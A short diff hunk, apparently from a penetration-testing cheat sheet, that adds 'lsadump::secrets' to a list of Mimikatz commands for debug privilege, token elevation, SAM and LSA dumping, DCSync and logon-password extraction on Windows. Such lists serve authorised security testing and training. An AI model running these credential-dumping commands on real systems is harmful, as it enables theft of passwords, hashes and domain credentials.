@@ -3377,6 +3377,7 @@ mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # lsadump::sam
 mimikatz # lsadump::lsa /patch
+mimikatz # lsadump::secrets
 mimikatz # lsadump::dcsync
 mimikatz # lsadump::dcsync /domain:<domain> /user:<domain>\<username>
 mimikatz # sekurlsa::logonpasswords
